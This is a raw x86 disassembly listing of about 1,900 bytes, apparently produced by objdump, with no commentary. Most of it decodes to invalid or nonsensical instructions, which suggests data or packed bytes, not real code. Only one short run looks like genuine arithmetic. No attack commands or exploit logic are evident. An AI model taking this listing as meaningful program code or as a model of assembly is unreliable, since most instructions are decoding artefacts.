  41c4cd:	stos   DWORD PTR es:[edi],eax
  41c4ce:	xchg   esp,eax
  41c4cf:	lods   al,BYTE PTR ds:[esi]
  41c4d0:	adc    eax,0x57fffca7
  41c4d5:	daa    
  41c4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d7:	les    eax,FWORD PTR [edi-0x7a30e5fc]
  41c4dd:	int3   
  41c4de:	inc    eax
  41c4df:	adc    eax,0xd0603cf8
  41c4e4:	jmp    0x97c9d8f
  41c4e9:	cmp    eax,0x15f9d031
  41c4ee:	arpl   si,si
  41c4f0:	and    DWORD PTR [edx+0x1969fc90],eax
  41c4f6:	shr    DWORD PTR ss:[ebx+0x59],1
  41c4fa:	xor    esi,DWORD PTR [ebp+0x518dd903]
  41c500:	add    bl,dl
  41c502:	repz xor BYTE PTR [eax-0x4cb3cc0],0x1f
  41c50a:	jne    0x41c4ab
  41c50c:	jp     0x41c4b7
  41c50e:	scas   al,BYTE PTR es:[edi]
  41c50f:	retf   0xd434
  41c512:	clc    
  41c513:	pop    eax
  41c514:	inc    ecx
  41c515:	cdq    
  41c516:	(bad)  
  41c517:	fwait
  41c518:	push   eax
  41c519:	dec    ebx
  41c51a:	(bad)  [esi]
  41c51c:	not    BYTE PTR ds:0xc1b4931d
  41c522:	xchg   esi,eax
  41c523:	jmp    0x987:0x9fbe7b8e
  41c52a:	cmp    ebp,edx
  41c52c:	sub    BYTE PTR [ebx-0x14],al
  41c52f:	loope  0x41c572
  41c531:	pop    esp
  41c532:	adc    ah,BYTE PTR [eax]
  41c534:	mov    al,0x39
  41c536:	sbb    ah,dh
  41c538:	and    al,0xb3
  41c53a:	cmp    cl,BYTE PTR [edx]
  41c53c:	sbb    BYTE PTR [edi-0x57],0x26
  41c540:	pop    esi
  41c541:	(bad)  
  41c542:	mov    edx,0x6ad93e5e
  41c547:	imul   DWORD PTR [edi-0x9]
  41c54a:	lock popf 
  41c54c:	retf   
  41c54d:	mov    edx,DWORD PTR [ebx-0x273da6f9]
  41c553:	xchg   ebp,eax
  41c554:	std    
  41c555:	cmp    al,0xeb
  41c557:	mov    edi,0x4bb2bdbd
  41c55c:	mov    ecx,0x4425b789
  41c562:	inc    edx
  41c563:	pop    edi
  41c564:	ins    BYTE PTR es:[edi],dx
  41c565:	sbb    eax,0xe3ddd78a
  41c56a:	outs   dx,BYTE PTR ds:[esi]
  41c56b:	int3   
  41c56c:	loope  0x41c50b
  41c56e:	mov    ebp,0x5a34e087
  41c573:	push   esi
  41c574:	xchg   ebx,eax
  41c575:	rep ins DWORD PTR es:[edi],dx
  41c577:	aam    0xfa
  41c579:	aas    
  41c57a:	push   edx
  41c57b:	push   ecx
  41c57c:	cmc    
  41c57d:	cmc    
  41c57e:	jo     0x41c57c
  41c580:	mov    cl,0xf1
  41c582:	xchg   edx,eax
  41c583:	xor    ecx,eax
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	pop    ss
  41c5d1:	mov    al,ds:0xe1febc02
  41c5d6:	jge    0x41c652
  41c5d8:	or     bl,BYTE PTR [edi+0x7a]
  41c5db:	jp     0x41c647
  41c5dd:	mov    dh,0x70
  41c5df:	sahf   
  41c5e0:	add    eax,0xf0d3f25c
  41c5e5:	sub    al,0xd5
  41c5e7:	push   cs
  41c5e8:	or     BYTE PTR [ebp+0x5019f239],al
  41c5ee:	add    esp,DWORD PTR [ebx+0x50]
  41c5f1:	mov    ds:0x6152b1ab,al
  41c5f6:	mov    al,ds:0xc86982d8
  41c5fb:	ret    
  41c5fc:	mov    ecx,DWORD PTR [esi+0x7deff369]
  41c602:	fdiv   st,st(1)
  41c604:	xor    al,BYTE PTR [ecx-0x1069abb4]
  41c60a:	sub    eax,0xb8017826
  41c60f:	add    eax,0x28ae7afc
  41c614:	xchg   ecx,eax
  41c615:	cld    
  41c616:	push   edx
  41c617:	push   edi
  41c618:	stc    
  41c619:	mov    ah,0x33
  41c61b:	ins    BYTE PTR es:[edi],dx
  41c61c:	stos   DWORD PTR es:[edi],eax
  41c61d:	push   es
  41c61e:	je     0x41c68b
  41c620:	jge    0x41c644
  41c622:	push   edx
  41c623:	fld    DWORD PTR [edi-0x6ca7198]
  41c629:	sub    ebx,ebx
  41c62b:	je     0x41c616
  41c62d:	xlat   BYTE PTR ds:[ebx]
  41c62e:	fistp  WORD PTR ds:0x8cde13dd
  41c634:	dec    esp
  41c635:	ss mov ebp,0x6e74fcac
  41c63b:	outs   dx,BYTE PTR ds:[esi]
  41c63c:	ss add eax,0xf38d33a4
  41c642:	call   0x691ad350
  41c647:	jnp    0x41c6af
  41c649:	aam    0x3
  41c64b:	push   ss
  41c64c:	adc    DWORD PTR [ebx],edx
  41c64e:	sub    al,al
  41c650:	sub    al,0x48
  41c652:	dec    ebp
  41c653:	xor    al,0x21
  41c655:	adc    eax,0x20fdba65
  41c65a:	ja     0x41c698
  41c65c:	mov    cl,0x49
  41c65e:	ror    ah,cl
  41c660:	mov    esi,cs
  41c662:	xor    al,0x8f
  41c664:	mov    ah,0x33
  41c666:	push   eax
  41c667:	sub    al,0x28
  41c669:	cmp    al,0x23
  41c66b:	fnstsw WORD PTR [edx+ebp*1-0x9]
  41c66f:	inc    ebp
  41c670:	fistp  DWORD PTR [edi]
  41c672:	popf   
  41c673:	mov    ds:0xb41376e1,eax
  41c678:	fsub   DWORD PTR [ebx-0x14e74f33]
  41c67e:	add    ebp,DWORD PTR [esi]
  41c680:	mov    ah,0x45
  41c682:	and    DWORD PTR [esi+0x18],eax
  41c685:	pop    ss
  41c686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c687:	(bad)  
  41c688:	adc    al,0x46
  41c68a:	pop    edx
  41c68b:	inc    eax
  41c68c:	sub    esi,eax
  41c68e:	jl     0x41c707
  41c690:	push   0xffffff8f
  41c692:	sbb    edx,DWORD PTR [ebx-0x8]
  41c695:	jecxz  0x41c6dd
  41c697:	mov    al,ds:0x673cc937
  41c69c:	ins    BYTE PTR es:[edi],dx
  41c69d:	dec    edx
  41c69e:	jne    0x41c68a
  41c6a0:	stos   DWORD PTR es:[edi],eax
  41c6a1:	scas   eax,DWORD PTR es:[edi]
  41c6a2:	arpl   bp,di
  41c6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6a5:	cmp    DWORD PTR [ebx+eax*1],eax
  41c6a8:	fwait
  41c6a9:	lods   eax,DWORD PTR ds:[esi]
  41c6aa:	jg     0x41c6b7
  41c6ac:	jno    0x41c6c1
  41c6ae:	test   DWORD PTR ds:0xe0d0f360,esp
  41c6b4:	mov    edi,0x603ba462
  41c6b9:	call   0x6ae92fd5
  41c6be:	fs inc esi
  41c6c0:	inc    edi
  41c6c1:	sbb    BYTE PTR [edi+0x79b71563],al
  41c6c7:	addr16 pop ebp
  41c6c9:	ds retf 
  41c6cb:	mov    esi,0x7c227332
  41c6d0:	xor    cl,BYTE PTR [edi-0x6d9ccfcd]
  41c6d6:	mov    al,0x66
  41c6d8:	ja     0x41c6d1
  41c6da:	sahf   
  41c6db:	lock sub ah,BYTE PTR ds:0xe0c53913
  41c6e2:	out    dx,al
  41c6e3:	mov    ah,BYTE PTR [edi-0x585d2696]
  41c6e9:	out    0x2b,al
  41c6eb:	stc    
  41c6ec:	pop    es
  41c6ed:	sbb    DWORD PTR [esi],esp
  41c6ef:	fistp  WORD PTR [ebx]
  41c6f1:	xor    DWORD PTR [eax],ebx
  41c6f3:	xchg   edi,eax
  41c6f4:	jbe    0x41c75f
  41c6f6:	or     dh,ah
  41c6f8:	push   ecx
  41c6f9:	sahf   
  41c6fa:	lods   al,BYTE PTR ds:[esi]
  41c6fb:	clc    
  41c6fc:	xchg   ebp,eax
  41c6fd:	nop
  41c6fe:	xchg   ebp,eax
  41c6ff:	xor    eax,0xccbeb9d2
  41c704:	lea    edi,[ecx]
  41c706:	push   eax
  41c707:	xchg   edx,eax
  41c708:	rcr    DWORD PTR [ecx+0x2bac91d6],0xb
  41c70f:	stos   BYTE PTR es:[edi],al
  41c710:	pop    edi
  41c711:	push   edx
  41c712:	add    al,0xfd
  41c714:	xor    dh,0xd0
  41c717:	dec    ecx
  41c718:	imul   BYTE PTR [edi]
  41c71a:	or     eax,0x790fe6a9
  41c71f:	and    al,bl
  41c721:	dec    ebx
  41c722:	das    
  41c723:	jb     0x41c718
  41c725:	retf   
  41c726:	cmp    esp,DWORD PTR [eax+0xb]
  41c729:	popa   
  41c72a:	mov    edx,es
  41c72c:	data16 fisttp DWORD PTR [esp+ebx*4+0x73]
  41c731:	fisub  WORD PTR [eax+0x6c]
  41c734:	fadd   DWORD PTR [edi]
  41c736:	mov    ebp,0x87fb0e56
  41c73b:	inc    ebx
  41c73c:	push   ds
  41c73d:	push   edi
  41c73e:	repz fs enter 0x832f,0xa3
  41c744:	arpl   WORD PTR [esi-0x5bc8b1eb],ax
  41c74a:	ficom  WORD PTR [ecx+0x1286edf]
  41c750:	sbb    dh,BYTE PTR [edi]
  41c752:	or     edi,DWORD PTR ds:0x700e0ccb
  41c758:	ja     0x41c7b3
  41c75a:	sbb    dl,dh
  41c75c:	push   ebp
  41c75d:	dec    ecx
  41c75e:	sets   bh
  41c761:	dec    DWORD PTR ds:0xca8be105
  41c767:	repz xor BYTE PTR [edx+eax*4],0xc7
  41c76c:	adc    al,0xee
  41c76e:	and    BYTE PTR [edx+0x4d41f293],bl
  41c774:	mov    ds:0x7eff49c7,al
  41c779:	cmc    
  41c77a:	retf   
  41c77b:	push   ss
  41c77c:	jge    0x41c7bb
  41c77e:	dec    eax
  41c77f:	xor    eax,0x3ea6e2b8
  41c784:	xor    eax,0xd5ec1bc1
  41c789:	sub    eax,0x74292a49
  41c78e:	aam    0xe0
  41c790:	rcr    BYTE PTR [ecx],cl
  41c792:	mov    dh,0xa4
  41c794:	dec    ecx
  41c795:	xchg   edx,eax
  41c796:	(bad)  
  41c798:	outs   dx,DWORD PTR ds:[esi]
  41c799:	push   0x34
  41c79b:	ins    DWORD PTR es:[edi],dx
  41c79c:	jle    0x41c7e8
  41c79e:	xchg   DWORD PTR ds:0xa53267aa,ebx
  41c7a4:	das    
  41c7a5:	rcr    BYTE PTR [ebp+0x2c],1
  41c7a8:	pop    esi
  41c7a9:	les    esp,FWORD PTR [edi+0x58]
  41c7ac:	or     dl,BYTE PTR [edi+edi*4-0x32]
  41c7b0:	popa   
  41c7b1:	and    eax,0xf357ae10
  41c7b6:	sbb    DWORD PTR [ecx],esp
  41c7b8:	rol    DWORD PTR [edi-0x6],cl
  41c7bb:	xchg   edx,eax
  41c7bc:	and    al,0xe0
  41c7be:	pop    ecx
  41c7bf:	shl    DWORD PTR [edx+ecx*8-0x32bf9a05],cl
  41c7c6:	dec    esp
  41c7c7:	fdiv   QWORD PTR [edi+0x6c]
  41c7ca:	rcr    DWORD PTR [eax],cl
  41c7cc:	xor    BYTE PTR [ecx-0x57],dh
  41c7cf:	inc    esp
  41c7d0:	scas   al,BYTE PTR es:[edi]
  41c7d1:	dec    edx
  41c7d2:	mov    esi,0x980e3cac
  41c7d7:	dec    ecx
  41c7d8:	das    
  41c7d9:	and    DWORD PTR [ebp+0x17],ebx
  41c7dc:	shl    DWORD PTR [ebp+0x41],0x60
  41c7e0:	clc    
  41c7e1:	inc    esi
  41c7e2:	in     eax,dx
  41c7e3:	aaa    
  41c7e4:	sti    
  41c7e5:	test   al,0x76
  41c7e7:	ret    
  41c7e8:	pop    edi
  41c7e9:	sub    esi,DWORD PTR [ecx-0x89542e5]
  41c7ef:	icebp  
  41c7f0:	xchg   ebx,eax
  41c7f1:	rcr    al,1
  41c7f3:	jne    0x41c778
  41c7f5:	mov    ah,0x27
  41c7f7:	daa    
  41c7f8:	sub    dh,BYTE PTR [edx-0x4c]
  41c7fb:	cmp    ecx,DWORD PTR [ebx+edi*2]
  41c7fe:	pop    esp
  41c7ff:	mov    eax,0x3aac8bd7
  41c804:	mov    dh,0x3
  41c806:	push   ds
  41c807:	sub    BYTE PTR [eax-0x48],ah
  41c80a:	pop    ecx
  41c80b:	jge    0x41c7f7
  41c80d:	lods   eax,DWORD PTR ds:[esi]
  41c80e:	push   0xc7bda3ae
  41c813:	cdq    
  41c814:	out    0x3d,eax
  41c816:	push   esp
  41c817:	(bad)  
  41c818:	int3   
  41c819:	aad    0x6a
  41c81b:	push   ebp
  41c81c:	mov    al,0x9
  41c81e:	test   al,0xe4
  41c820:	push   edi
  41c821:	cdq    
  41c822:	jae    0x41c892
  41c824:	ret    
  41c825:	repz lock aaa 
  41c828:	mov    bl,0x9
  41c82a:	(bad)  
  41c82c:	arpl   WORD PTR [eax-0x47],sp
  41c82f:	in     eax,0x86
  41c831:	clc    
  41c832:	cmc    
  41c833:	aad    0xf2
  41c835:	ja     0x41c837
  41c837:	call   0x81f6:0x42d821ce
  41c83e:	sub    edx,esp
  41c840:	hlt    
  41c841:	sbb    DWORD PTR [ebx+0x71],ecx
  41c844:	xchg   esp,eax
  41c845:	stos   BYTE PTR es:[edi],al
  41c846:	popf   
  41c847:	xchg   BYTE PTR [ebp+0x1c34b70],dh
  41c84d:	inc    eax
  41c84e:	add    DWORD PTR [esi+edi*2],edi
  41c851:	aas    
  41c852:	dec    esp
  41c853:	sub    ebx,DWORD PTR ds:0x5e0f0785
  41c859:	xor    BYTE PTR es:[ebp-0x76083148],dl
  41c860:	fsubp  st(3),st
  41c862:	push   eax
  41c863:	shl    esi,1
  41c865:	jmp    0x14e1:0xa28a0cee
  41c86c:	stos   DWORD PTR es:[edi],eax
  41c86d:	cmp    eax,0xad638aff
  41c872:	add    edx,DWORD PTR [ecx-0x13]
  41c875:	lods   al,BYTE PTR ds:[esi]
  41c876:	nop
  41c877:	jmp    0x41c8f1
  41c879:	and    eax,0xf872a48
  41c87e:	stc    
  41c87f:	sub    al,0xe0
  41c881:	or     edi,0x6db0efd1
  41c887:	jae    0x41c878
  41c889:	(bad)  
  41c88a:	das    
  41c88b:	or     DWORD PTR [ecx+0x77],edi
  41c88e:	mov    BYTE PTR ds:0x4f2cf893,cl
  41c894:	lea    ebp,[ecx]
  41c896:	fld    TBYTE PTR [edi+0x5c0c20c9]
  41c89c:	jbe    0x41c8d1
  41c89e:	std    
  41c89f:	aad    0x7a
  41c8a1:	ret    0xb811
  41c8a4:	and    al,0x7f
  41c8a6:	sbb    ah,BYTE PTR [eax+0x794701d6]
  41c8ac:	shl    DWORD PTR [ecx+0x3d],cl
  41c8af:	jg     0x41c867
  41c8b1:	int3   
  41c8b2:	ret    0x9455
  41c8b5:	in     eax,0x25
  41c8b7:	sbb    DWORD PTR [ecx-0x37],ebp
  41c8ba:	pop    ss
  41c8bb:	inc    eax
  41c8bc:	shl    bh,1
  41c8be:	inc    ebx
  41c8bf:	or     DWORD PTR [eax-0x23694f03],esi
  41c8c5:	cs ret 
  41c8c7:	mov    bh,0xb8
  41c8c9:	std    
  41c8ca:	lods   al,BYTE PTR ds:[esi]
  41c8cb:	loope  0x41c85a
  41c8cd:	int    0xbc
  41c8cf:	clc    
  41c8d0:	mov    dh,0xba
  41c8d2:	or     ch,ah
  41c8d4:	xchg   esp,eax
  41c8d5:	sub    BYTE PTR [eax],0xa3
  41c8d8:	mov    ch,0x7b
  41c8da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8db:	ss pop ds
  41c8dd:	ins    DWORD PTR es:[edi],dx
  41c8de:	arpl   WORD PTR [ecx+0x45],ax
  41c8e1:	(bad)  
  41c8e2:	in     al,0xa3
  41c8e4:	jns    0x41c919
  41c8e6:	ins    DWORD PTR es:[edi],dx
  41c8e7:	(bad)  
  41c8e8:	je     0x41c8b1
  41c8ea:	in     eax,dx
  41c8eb:	jne    0x41c969
  41c8ed:	mov    BYTE PTR [edi],dl
  41c8ef:	push   edi
  41c8f0:	jp     0x41c926
  41c8f2:	pop    edx
  41c8f3:	mov    cl,BYTE PTR ds:0x39b1cec
  41c8f9:	cmp    dh,BYTE PTR [edx-0x6b4183c]
  41c8ff:	out    0x97,ax
  41c902:	out    0x7,eax
  41c904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c905:	retf   
  41c906:	dec    eax
  41c907:	sub    cl,BYTE PTR [ecx]
  41c909:	jmp    0x9ef14fe6
  41c90e:	dec    ebp
  41c90f:	push   edx
  41c910:	ds bswap edi
  41c913:	sbb    ah,al
  41c915:	fdivr  st,st(7)
  41c917:	das    
  41c918:	addr16 dec ebp
  41c91a:	jge    0x41c8e0
  41c91c:	ror    DWORD PTR [eax+0x3a],0x56
  41c920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c921:	xor    dl,dl
  41c923:	in     al,0x3
  41c925:	out    0x6c,eax
  41c927:	leave  
  41c928:	pop    eax
  41c929:	mov    ds:0x38ba79a7,eax
  41c92e:	imul   eax,DWORD PTR [edi-0x11],0xfc4e27f0
  41c935:	popf   
  41c936:	or     BYTE PTR [edx-0x6e],dl
  41c939:	ins    DWORD PTR es:[edi],dx
  41c93a:	inc    ebx
  41c93b:	jle    0x41c8f1
  41c93d:	das    
  41c93e:	sbb    BYTE PTR [ecx-0x5],ah
  41c941:	lods   al,BYTE PTR ds:[esi]
  41c942:	outs   dx,DWORD PTR ds:[esi]
  41c943:	gs ror bl,cl
  41c946:	loopne 0x41c8f8
  41c948:	enter  0x9bac,0x81
  41c94c:	sbb    BYTE PTR [edx],ah
  41c94e:	imul   esp,DWORD PTR ds:0x2101af50,0xfb6767ab
  41c958:	scas   eax,DWORD PTR es:[edi]
  41c959:	sub    BYTE PTR es:[edi],bh
  41c95c:	pop    eax
  41c95d:	push   0x212c3e1c
  41c962:	lahf   
  41c963:	or     cl,BYTE PTR [edx]
  41c965:	mov    ebp,0xaa20573a
  41c96a:	xchg   DWORD PTR [ebp+0x739ef624],edx
  41c970:	inc    esp
  41c971:	adc    ebx,edi
  41c973:	push   esp
  41c974:	pop    edx
  41c975:	and    BYTE PTR [ecx-0x2],cl
  41c978:	push   esp
  41c979:	ss cmovae edx,edi
  41c97d:	aas    
  41c97e:	dec    ebp
  41c97f:	pop    ecx
  41c980:	stos   DWORD PTR es:[edi],eax
  41c981:	adc    eax,0x1ce1330c
  41c986:	sub    BYTE PTR [edi+0x3ec1a033],al
  41c98c:	mov    ?,edi
  41c98e:	mov    ebx,DWORD PTR [eax]
  41c990:	cs cdq 
  41c992:	jp     0x41c9e7
  41c994:	call   0xe38:0xd5e70466
  41c99b:	mov    DWORD PTR [edi+esi*1-0x5d5ff5b8],ebx
  41c9a2:	cld    
  41c9a3:	shr    BYTE PTR [ecx+0x65],1
  41c9a6:	ret    0xdd8f
  41c9a9:	jmp    0xc529489a
  41c9ae:	repnz pop es
  41c9b0:	pop    ds
  41c9b1:	adc    DWORD PTR [ecx],esi
  41c9b3:	pop    esp
  41c9b4:	and    ebp,DWORD PTR [ebp-0x3f]
  41c9b7:	pop    ds
  41c9b8:	xchg   ebx,eax
  41c9b9:	sub    al,BYTE PTR [eax+0x42]
  41c9bc:	je     0x41c97e
  41c9be:	(bad)  
  41c9bf:	in     al,dx
  41c9c0:	xor    dl,BYTE PTR [edx-0x5f]
  41c9c3:	adc    eax,0x41189424
  41c9c8:	retf   0x5009
  41c9cb:	jnp    0x41c95b
  41c9cd:	jo     0x41ca48
  41c9cf:	adc    DWORD PTR [edi],ecx
  41c9d1:	lods   eax,DWORD PTR ds:[esi]
  41c9d2:	xchg   BYTE PTR [edx+0x3e],dh
  41c9d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9d6:	adc    BYTE PTR [ebx-0xdda85b6],bh
  41c9dc:	sub    al,0x6a
  41c9de:	push   ebp
  41c9df:	and    al,0xf8
  41c9e1:	xchg   esi,eax
  41c9e2:	in     al,0x4a
  41c9e4:	pushf  
  41c9e5:	sub    eax,0x2b6d005c
  41c9ea:	sti    
  41c9eb:	push   0x1
  41c9ed:	add    edi,DWORD PTR [ecx]
  41c9ef:	ret    
  41c9f0:	not    BYTE PTR [esi+0x17a57248]
  41c9f6:	or     esp,DWORD PTR [edi-0x65db39b4]
  41c9fc:	dec    edi
  41c9fd:	js     0x41ca2c
  41c9ff:	popa   
  41ca00:	fxch   st(2)
  41ca02:	icebp  
  41ca03:	loope  0x41ca1a
  41ca05:	adc    al,0x28
  41ca07:	cmp    DWORD PTR [eax+0x41f7e475],ecx
  41ca0d:	mov    WORD PTR [edx],es
  41ca0f:	aam    0xab
  41ca11:	mov    edx,0xbebcfe8
  41ca16:	cmc    
  41ca17:	mov    dh,0x1c
  41ca19:	and    ch,BYTE PTR [eax]
  41ca1b:	loopne 0x41c9e7
  41ca1d:	jle    0x41c9d9
  41ca1f:	sbb    ecx,edx
  41ca21:	call   0x590330a
  41ca26:	shl    BYTE PTR [esi+eax*4],1
  41ca29:	ficomp DWORD PTR [edx+eax*8+0x74841e8d]
  41ca30:	lds    eax,FWORD PTR [eax+0x17]
  41ca33:	jbe    0x41c9e2
  41ca35:	(bad)  
  41ca36:	jb     0x41c9f9
  41ca38:	jo     0x41ca99
  41ca3a:	inc    esi
  41ca3b:	adc    eax,DWORD PTR [ecx]
  41ca3d:	push   edi
  41ca3e:	imul   esi,DWORD PTR [edx],0xffffffae
  41ca41:	dec    edx
  41ca42:	push   cs
  41ca43:	lahf   
  41ca44:	mov    DWORD PTR [edx+0x1790abf7],esp
  41ca4a:	mov    ecx,0xd76da681
  41ca4f:	lock pop edx
  41ca51:	out    dx,al
  41ca52:	and    eax,0x11067076
  41ca57:	add    bh,BYTE PTR [esi+0xd]
  41ca5a:	dec    edi
  41ca5b:	sub    edi,ebp
  41ca5d:	arpl   WORD PTR [eax-0x5e0474fd],dx
  41ca63:	aad    0xa5
  41ca65:	add    DWORD PTR [edi],esp
  41ca67:	cmp    eax,0x3712ea99
  41ca6c:	sub    esp,DWORD PTR [ebx-0x48dff31]
  41ca72:	cmp    al,0x65
  41ca74:	sbb    bl,BYTE PTR [eax]
  41ca76:	(bad)  
  41ca77:	mov    edx,0xc93ed47b
  41ca7c:	push   esp
  41ca7d:	adc    ebp,DWORD PTR [ecx+ebp*1+0x4d]
  41ca81:	xor    eax,ecx
  41ca83:	or     eax,0x1fc2ac70
  41ca88:	inc    ecx
  41ca89:	cdq    
  41ca8a:	pop    ecx
  41ca8b:	jg     0x41ca43
  41ca8d:	dec    edx
  41ca8e:	sahf   
  41ca8f:	jg     0x41ca50
  41ca91:	cmp    DWORD PTR [ebx+0x64],edi
  41ca94:	push   ebp
  41ca95:	pop    ecx
  41ca96:	sub    edx,DWORD PTR [esi+0x19d6ff33]
  41ca9c:	std    
  41ca9d:	mov    esp,0x11a94051
  41caa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caa3:	mov    ecx,0xf18aa899
  41caa8:	inc    esp
  41caa9:	cmp    al,0xe1
  41caab:	ret    0xaa97
  41caae:	xchg   cx,ax
  41cab0:	pusha  
  41cab1:	dec    esi
  41cab2:	pop    eax
  41cab3:	test   ecx,ebp
  41cab5:	std    
  41cab6:	pop    esi
  41cab7:	bound  edi,QWORD PTR [edx+0x5aa74b6]
  41cabd:	lahf   
  41cabe:	push   esp
  41cabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac0:	ja     0x41cad5
  41cac2:	xor    eax,0x718ebaac
  41cac7:	shl    DWORD PTR [edx+0x555154d8],cl
  41cacd:	and    bh,bh
  41cacf:	ss imul ebx,edi,0xf5f73afb
  41cad6:	mov    ds:0xc2a5df53,al
  41cadb:	or     DWORD PTR ds:0x59f3fb79,ebx
  41cae1:	pop    ecx
  41cae2:	call   DWORD PTR [ecx]
  41cae4:	xchg   esi,eax
  41cae5:	daa    
  41cae6:	adc    dl,BYTE PTR [ecx]
  41cae8:	sub    DWORD PTR [edx+ecx*4+0xb5605dd],ecx
  41caef:	inc    ebp
  41caf0:	sti    
  41caf1:	stos   BYTE PTR es:[edi],al
  41caf2:	or     al,0x1
  41caf4:	xchg   ebx,eax
  41caf5:	dec    ecx
  41caf6:	jb     0x41cafe
  41caf8:	pop    es
  41caf9:	adc    ebx,DWORD PTR [ecx+eiz*2+0x3b1bb3f8]
  41cb00:	sub    eax,0x8c08afd1
  41cb05:	lahf   
  41cb06:	add    BYTE PTR [eax+edi*8],dl
  41cb09:	inc    ecx
  41cb0a:	cmp    eax,0x365b730
  41cb0f:	rcl    ebx,0x61
  41cb12:	push   esp
  41cb13:	add    bl,BYTE PTR [ebp+0x26]
  41cb16:	rdpmc  
  41cb18:	push   esp
  41cb19:	adc    al,0x21
  41cb1b:	pop    ds
  41cb1c:	rol    BYTE PTR [eax-0x67781ae9],cl
  41cb22:	test   eax,0x7c1803c8
  41cb27:	lea    edi,[ecx+0x46bb5690]
  41cb2d:	xchg   DWORD PTR [edx+0x5a3cb6be],ebp
  41cb33:	sub    dh,BYTE PTR [edx+0x38e8d435]
  41cb39:	jp     0x41cae6
  41cb3b:	push   ebx
  41cb3c:	mov    dl,0xbc
  41cb3e:	dec    esi
  41cb3f:	adc    eax,ecx
  41cb41:	push   ds
  41cb42:	ja     0x41cb9d
  41cb44:	jle    0x41cb69
  41cb46:	lods   al,BYTE PTR ds:[esi]
  41cb47:	int    0x12
  41cb49:	std    
  41cb4a:	xor    eax,DWORD PTR ds:0xd04f71aa
  41cb50:	add    DWORD PTR [esi-0x47],0xffffff95
  41cb54:	popa   
  41cb55:	ins    DWORD PTR es:[edi],dx
  41cb56:	mov    esi,0x3b8d61a0
  41cb5b:	cld    
  41cb5c:	jmp    esp
  41cb5e:	cmp    ecx,esi
  41cb60:	jnp    0x41cb43
  41cb62:	fsub   st,st(6)
  41cb64:	jmp    0x3ac:0x5c369d6b
  41cb6b:	xlat   BYTE PTR ds:[ebx]
  41cb6d:	repz sub ch,BYTE PTR fs:[ebp+0x58e9892a]
  41cb75:	in     al,0xf3
  41cb77:	jmp    0x14e9865e
  41cb7c:	sub    bl,BYTE PTR [edx+0x23]
  41cb7f:	pop    edi
  41cb80:	(bad)  
  41cb82:	mov    al,0xef
  41cb84:	fldenv [eax+edx*1]
  41cb87:	test   eax,0xa40ce3b7
  41cb8c:	sub    DWORD PTR [ecx],eax
  41cb8e:	pop    esi
  41cb8f:	dec    ebx
  41cb90:	shr    BYTE PTR [edi-0x62],cl
  41cb93:	call   0x60a1:0xe4daed25
  41cb9a:	(bad)  
  41cb9b:	icebp  
  41cb9c:	aaa    
  41cb9d:	test   BYTE PTR [esi-0x1d],bh
  41cba0:	cmp    bh,bl
  41cba2:	cld    
  41cba3:	das    
  41cba4:	sub    eax,0x5ad915f3
  41cba9:	int3   
  41cbaa:	scas   eax,DWORD PTR es:[edi]
  41cbab:	pop    ebx
  41cbac:	nop
  41cbad:	push   ebx
  41cbae:	pushf  
  41cbaf:	leave  
  41cbb0:	leave  
  41cbb1:	jle    0x41cbb3
  41cbb3:	into   
  41cbb4:	test   eax,0x51bfa849
  41cbb9:	xchg   esi,esi
  41cbbb:	mov    bl,0x71
  41cbbd:	xor    esp,DWORD PTR [ebp-0x31]
  41cbc0:	bound  edi,QWORD PTR [eax+edi*1+0x680f2673]
  41cbc7:	daa    
  41cbc8:	mov    ebp,0x2ab07bce
  41cbcd:	(bad)  
  41cbce:	int3   
  41cbcf:	lock jmp 0x41cc4a
  41cbd2:	imul   edi,DWORD PTR [ecx+0x972f6f2],0x93cd6cda
  41cbdc:	ret    0xba47
  41cbdf:	pop    ss
  41cbe0:	mov    bh,0x46
  41cbe2:	push   0x1704d097
  41cbe7:	lods   eax,DWORD PTR ds:[esi]
  41cbe8:	xor    eax,0xb235ce17
  41cbed:	out    0x78,al
  41cbef:	pop    esi
  41cbf0:	clc    
  41cbf1:	xchg   edx,eax
  41cbf2:	mov    al,0x37
  41cbf4:	icebp  
  41cbf5:	pop    esi
  41cbf6:	inc    ecx
  41cbf7:	imul   ebx,DWORD PTR [ecx],0xdba30a03
  41cbfd:	mov    edi,0xb89a300e
  41cc02:	das    
  41cc03:	mov    bl,0xaa
  41cc05:	mov    ebx,0x35a9bdf3
  41cc0a:	pop    ebx
  41cc0b:	outs   dx,BYTE PTR ds:[esi]
  41cc0c:	push   ss
  41cc0d:	scas   al,BYTE PTR es:[edi]
  41cc0e:	aas    
  41cc0f:	mov    BYTE PTR [ebx-0x78a82ebb],ch
  41cc15:	mov    ecx,0xe3d90485
  41cc1a:	jns    0x41cc59
  41cc1c:	xchg   DWORD PTR [edx+0x228ba98c],ebx
